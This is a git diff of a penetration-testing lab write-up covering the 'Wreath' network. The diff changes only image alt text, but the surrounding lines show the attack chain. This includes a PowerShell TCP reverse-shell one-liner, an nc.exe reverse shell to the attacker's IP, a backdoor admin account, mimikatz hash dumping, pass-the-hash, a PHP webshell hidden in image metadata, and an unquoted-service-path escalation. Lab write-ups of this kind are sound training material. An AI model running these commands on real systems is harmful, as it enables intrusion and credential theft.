@@ -180,16 +180,16 @@ the way I want.
 
 First set the targets IP addresses to the variable ‘ip’
 
-![](/assets/img/wreath-writeup/modification1.png)
+![alt-1](/assets/img/wreath-writeup/modification1.png)
 
 Then adjust the filename that the payload will be called.
 
-![](/assets/img/wreath-writeup/modification2.png)
+![alt-2](/assets/img/wreath-writeup/modification2.png)
 
 This exploit will create a backdoor to execute remote commands and later
 it will be used to trigger a full reverse shell on the target machine.
 
-![](/assets/img/wreath-writeup/exploit2.png)
+![alt-3](/assets/img/wreath-writeup/exploit2.png)
 
 This uploads the backdoor to the target and triggers the ‘whoami’
 command. I can see that I am NT **AUTHORITY\SYSTEM**, which is like
@@ -199,7 +199,7 @@ With the backdoor uploaded, I can send a post request to the malicious
 file from now on and place whatever payload I like into the ‘a=’
 parameter.
 
-![](/assets/img/wreath-writeup/post_requests.png)
+![alt-4](/assets/img/wreath-writeup/post_requests.png)
 
 ### Firewall 
 
@@ -212,17 +212,17 @@ shell without punching a hole in the firewall.
 To check, I will send a ping command to the attack machine from the
 compromised target and listen for ICMP requests using TCPdump.
 
-![](/assets/img/wreath-writeup/tcpPing.png)
+![alt-5](/assets/img/wreath-writeup/tcpPing.png)
 
 Each of the ICMP requests failed and TCPdump didn’t receive anything.
 
-![](/assets/img/wreath-writeup/tcpDump.png)
+![alt-6](/assets/img/wreath-writeup/tcpDump.png)
 
 This means I will have to open a port in the firewall on the production
 server in order to get a connection between the GitServer and the attack
 machine.
 
-![](/assets/img/wreath-writeup/firewall-cmd.png)
+![alt-7](/assets/img/wreath-writeup/firewall-cmd.png)
 
 **Jump Server and Hop Listener**
 
@@ -235,7 +235,7 @@ traffic to the main http listener.
 
 First, I created the Hop_Listener
 
-![](/assets/img/wreath-writeup/http_hop_listener.png)
+![alt-8](/assets/img/wreath-writeup/http_hop_listener.png)
 
 Then specify the **Host** as the Production Server IP address. I set the
 **Port** to the port I just opened on the Production Server, **23598**.
@@ -250,7 +250,7 @@ in place, I will start the PHP server by running this command in the
 
 `php –S 0.0.0.0:23597 &\>/dev/null &`
 
-![](/assets/img/wreath-writeup/http_hop.png)
+![alt-9](/assets/img/wreath-writeup/http_hop.png)
 
 ### Launcher Stager 
 
@@ -259,26 +259,26 @@ PowerShell launcher that connects to the jump server and then to the C2.
 I’m using the **multi/launcher** stager here and setting the
 **Listener** to be **http_hop**.
 
-![](/assets/img/wreath-writeup/multi_stager.png)
+![alt-10](/assets/img/wreath-writeup/multi_stager.png)
 
-![](/assets/img/wreath-writeup/launcher_stager.png)
+![alt-11](/assets/img/wreath-writeup/launcher_stager.png)
 
 ### Preparing for Transport
 
 Executing the launcher stager generates a PowerShell script. This script
 will be prepared for transport by URL encoding it.
 
-![](/assets/img/wreath-writeup/stager_encode.png)
+![alt-12](/assets/img/wreath-writeup/stager_encode.png)
 
 ### Sending the Payload
 
 With the payload now URL encoded, I send it using the post request
 method with curl.
-![](/assets/img/wreath-writeup/sendingStager.png)
+![alt-13](/assets/img/wreath-writeup/sendingStager.png)
 
 Now I have got a new agent in the C2 to do further enumeration on.
 
-![](/assets/img/wreath-writeup/C2Connection2.png)
+![alt-14](/assets/img/wreath-writeup/C2Connection2.png)
 
 Since I’m still learning how to effectively use Empire, I’ll also get a
 classic reverse shell with netcat by sending the following payload after
@@ -288,9 +288,9 @@ binary on the server, I start the listener and send the payload:
 
 `powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();\[byte\[\]\]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '\> ';$sendbyte = (\[text.encoding\]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` 
 
-![](/assets/img/wreath-writeup/Pwr_to_nc.png)
+![alt-15](/assets/img/wreath-writeup/Pwr_to_nc.png)
 
-![](/assets/img/wreath-writeup/netCat.png)
+![alt-16](/assets/img/wreath-writeup/netCat.png)
 
 
 ### Post-Exploitation
@@ -298,7 +298,7 @@ binary on the server, I start the listener and send the payload:
 Due to having access to the GitServer as NT AUTHORITY\SYSTEM, there is
 no need to escalate privileges.
 
-![](/assets/img/wreath-writeup/nmap_service.png)
+![alt-17](/assets/img/wreath-writeup/nmap_service.png)
 
 From the earlier port scan, **3389** and **5985** are also open. 3389 is
 used to enable users to access remote computers and 5985 is the default
@@ -317,20 +317,20 @@ net localgroup Administrators l15t3nr /add
 net localgroup “Remote Management Users” l15t3nr /add
 ```
 
-![](/assets/img/wreath-writeup/user_add.png)
+![alt-18](/assets/img/wreath-writeup/user_add.png)
 
 Now I can connect to a remote management shell with evil-winrm
 
 `evil-winrm –u l15t3nr –p l15t3nr -i 10.200.73.150`
 
-![](/assets/img/wreath-writeup/evil-winrm-l15t3nr.png)
+![alt-19](/assets/img/wreath-writeup/evil-winrm-l15t3nr.png)
 
 Next, I'll be connecting with RDP to get an interactive GUI session and
 sharing the resource to mimikatz in order to use the tool.
 
 `xfreerdp /v:10.200.73.150 /u:l15t3nr /p:l15t3nr +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share`
 
-![](/assets/img/wreath-writeup/RDP.png)
+![alt-20](/assets/img/wreath-writeup/RDP.png)
 
 Running the following command in an administrative command prompt will
 start mimikatz.
@@ -340,16 +340,16 @@ start mimikatz.
 Next, I give myself debug privileges and elevate the integrity to SYSTEM
 level.
 
-![](/assets/img/wreath-writeup/mimikatz1.png)
+![alt-21](/assets/img/wreath-writeup/mimikatz1.png)
 
 Now, I will dump all the SAM local password hashes:
 
-![](/assets/img/wreath-writeup/AdministratorHash.png)
+![alt-22](/assets/img/wreath-writeup/AdministratorHash.png)
 
 With the Administrator hash I can pass-the-hash using evil-winrm and
 login as the administrator.
 
-![](/assets/img/wreath-writeup/evil-Admin.png)
+![alt-23](/assets/img/wreath-writeup/evil-Admin.png)
 
 ### **Post-Enumeration**
 
@@ -361,14 +361,14 @@ by AV/EDR if that’s running on the system. If you’re reading this and
 you know of a better way to enumerate ports without touching disk or
 triggering AV/EDR, please let me know on Twitter **@L15t3Nr**.
 
-![](/assets/img/wreath-writeup/Pwr_Port_Scan.png)
+![alt-24](/assets/img/wreath-writeup/Pwr_Port_Scan.png)
 
 The **Hosts** are set to the IP address and the ports are left default.
 The **Agent** is set to the GitServer’s agent. Executing the module
 initiates the PowerShell script and it returns some interesting
 information.
 
-![](/assets/img/wreath-writeup/Pwr_Port_Scan_Result.png)
+![alt-25](/assets/img/wreath-writeup/Pwr_Port_Scan_Result.png)
 
 Ports **80** and **3389** are open.
 
@@ -387,15 +387,15 @@ Fetching a static binary of Chisel is simple enough. Evil-winrm has a
 convenient **upload** feature that allows me to upload tools to the
 target. 
 
-![](/assets/img/wreath-writeup/firewall-chisel.png)
+![alt-26](/assets/img/wreath-writeup/firewall-chisel.png)
 
 I start the chisel server on port 23600 set port 9090 as the proxy port. 
 
-![](/assets/img/wreath-writeup/chisel-server.png)
+![alt-27](/assets/img/wreath-writeup/chisel-server.png)
 
 The chisel client connects to the server on port 23600 and uses the proxy port of 9090. I'm using foxyproxy in my browser to navigate to the remote webpage.
 
-![](/assets/img/wreath-writeup/chisel-client.png)
+![alt-28](/assets/img/wreath-writeup/chisel-client.png)
 
 ## Wreath PC (.100)
 
@@ -404,17 +404,17 @@ The chisel client connects to the server on port 23600 and uses the proxy port o
 The website is a clone of the Gitserver’s webpage and it’s running php
 7.4.11
 
-![](/assets/img/wreath-writeup/Wreath-PC-webpage.png)
+![alt-29](/assets/img/wreath-writeup/Wreath-PC-webpage.png)
 
 The GitStack directory is worth exploring since it has more details
 about the backend.
 
-![](/assets/img/wreath-writeup/gitstack-dir.png)
+![alt-30](/assets/img/wreath-writeup/gitstack-dir.png)
 
 There’s an interesting git directory that I’ll download and inspect
 locally.
 
-![](/assets/img/wreath-writeup/Gitstack-dir2.png)
+![alt-31](/assets/img/wreath-writeup/Gitstack-dir2.png)
 
 <span id="_Toc1262132117" class="anchor"></span>**Commits**
 
@@ -429,7 +429,7 @@ clone it with:
 Now, I’ll run the GitTools extractor in the same directory as ‘.git’ and
 it creates a new directory called **Website**.
 
-![](/assets/img/wreath-writeup/extractor.png)
+![alt-32](/assets/img/wreath-writeup/extractor.png)
 
 This directory contains commits and identifying the order of these
 commits will help me pinpoint the most recent commit in hopes that it
@@ -440,7 +440,7 @@ Each commit has a ‘commit-meta.txt’ that I can use to get the order. I
 enter the ‘**Website**’ directory and cat out each of the
 commit-meta.txt files in each directory.
 
-![](/assets/img/wreath-writeup/commit-meta.png)
+![alt-33](/assets/img/wreath-writeup/commit-meta.png)
 
 The first commit is easy to find as it has no parent commit and
 corresponds to ‘0-’. The next commit in order is ‘2-’ as it has a parent
@@ -460,7 +460,7 @@ The commit order is:
 Within the ‘1-’ directory is the most up-to-date version of the website,
 and it happens to contain an upload feature in ‘**resources/index.php**’
 
-![](/assets/img/wreath-writeup/resources-index.png)
+![alt-34](/assets/img/wreath-writeup/resources-index.png)
 
 I can’t access the resources without valid credentials. This is where
 the hash for Thomas obtained from mimikatz came in handy. I was able to
@@ -469,7 +469,7 @@ guess the password using hashcat.
 Logging in with thomas : I\<3ruby is a success and I get access to the
 resource.
 
-![](/assets/img/wreath-writeup/resources-index2.png)
+![alt-35](/assets/img/wreath-writeup/resources-index2.png)
 
 ### Filter Bypass
 
@@ -537,7 +537,7 @@ exif data to test if the php will run.
 
 The filename will look something like cat-L15t3Nr.jpg.php
 
-![](/assets/img/wreath-writeup/cat.jpeg)
+![alt-36](/assets/img/wreath-writeup/cat.jpeg)
 
 The payload:
 
@@ -570,7 +570,7 @@ Now, to inject this payload into an image file:
 The image file looks the same, except now there is a malicious comment
 in the meta data that will run when its executed.
 
-![](/assets/img/wreath-writeup/meta-data.png)
+![alt-37](/assets/img/wreath-writeup/meta-data.png)
 
 Now, it's time to upload the malicious image file. The file uploads
 successfully.
@@ -580,7 +580,7 @@ http://10.200.81.100/resources/uploads/cat-L15t3Nr.jpg.php?wreath=systeminfo
 
 I get the following response:
 
-![](/assets/img/wreath-writeup/PoC.png)
+![alt-38](/assets/img/wreath-writeup/PoC.png)
 
 Which proves the exploit is a success! Now for a reverse shell.
 
@@ -596,11 +596,11 @@ I first created a new directory for myself in the temp directory. Then I
 uploaded the netcat binary and outputted it to my directory. Then I
 checked the directory to make sure it uploaded.
 
-![](/assets/img/wreath-writeup/nc-upload.png)
+![alt-39](/assets/img/wreath-writeup/nc-upload.png)
 
-![](/assets/img/wreath-writeup/nc-upload-proof.png)
+![alt-40](/assets/img/wreath-writeup/nc-upload-proof.png)
 
-![](/assets/img/wreath-writeup/l15t3nr-directory-check.png)
+![alt-41](/assets/img/wreath-writeup/l15t3nr-directory-check.png)
 
 With netcat uploaded, I can use it to connect back to my local machine
 for a reverse shell.
@@ -610,11 +610,11 @@ the following in the wreath parameter:
 
 `powershell.exe c:\\\Windows\\\Temp\\\L15t3Nr\\\nc.exe 10.50.82.91 1337 –e cmd.exe` 
 
-![](/assets/img/wreath-writeup/reverseshell-1.png)
+![alt-42](/assets/img/wreath-writeup/reverseshell-1.png)
 
 The command was successful, and I got a reverse shell!
 
-![](/assets/img/wreath-writeup/reverseshell-2.png)
+![alt-43](/assets/img/wreath-writeup/reverseshell-2.png)
 
 ### Post-Enumeration
 
@@ -631,7 +631,7 @@ whoami /priv
 The ‘SeImpersonatePrivilege’ sounds interesting. It allows me to
 “impersonate a client after authentication”
 
-![](/assets/img/wreath-writeup/groups-priv.png)
+![alt-44](/assets/img/wreath-writeup/groups-priv.png)
 
 I’ll also look at the Windows services and hopefully find something user
 installed.
@@ -640,7 +640,7 @@ Non-default services check:
 
 `wmic service get name,displayname,pathname,startmode | findstr /v /i “C:\Windows”` 
 
-![](/assets/img/wreath-writeup/windows-services.png)
+![alt-45](/assets/img/wreath-writeup/windows-services.png)
 
 There is a vulnerability known as an “Unquoted Service Path” attack,
 which could lead to a privilege escalation given that the path contains
@@ -657,13 +657,13 @@ To check who the service is running as:
 
 The service is running as local system.
 
-![](/assets/img/wreath-writeup/service-running.png)
+![alt-46](/assets/img/wreath-writeup/service-running.png)
 
 Now to check if the directory is writable.
 
 `powershell “get-acl –Path ‘C:\Program Files (x86)\System Explorer’ | format-list”`
 
-![](/assets/img/wreath-writeup/Writable-directory.png)
+![alt-47](/assets/img/wreath-writeup/Writable-directory.png)
 
 The access is given to those in the Users group, so I can write to this
 path!
@@ -704,7 +704,7 @@ Then the wrapper.cs file is compiled with mcs:
 
 `msc Wrapper.cs`
 
-![](/assets/img/wreath-writeup/Get-Wrapper.png)
+![alt-48](/assets/img/wreath-writeup/Get-Wrapper.png)
 
 A writable directory is located at C:\Program Files (x86)\System
 Explorer\\ and my wrapper program will be named System.exe in this
@@ -719,9 +719,9 @@ And then
 
 `sc start SystemExplorerHelpService`
 
-![](/assets/img/wreath-writeup/PrivilegeEscalation.png)
+![alt-49](/assets/img/wreath-writeup/PrivilegeEscalation.png)
 
-![](/assets/img/wreath-writeup/AllThePrivs.png)
+![alt-50](/assets/img/wreath-writeup/AllThePrivs.png)
 
 Now I have obtained all the privileges on all the machines 😊
 
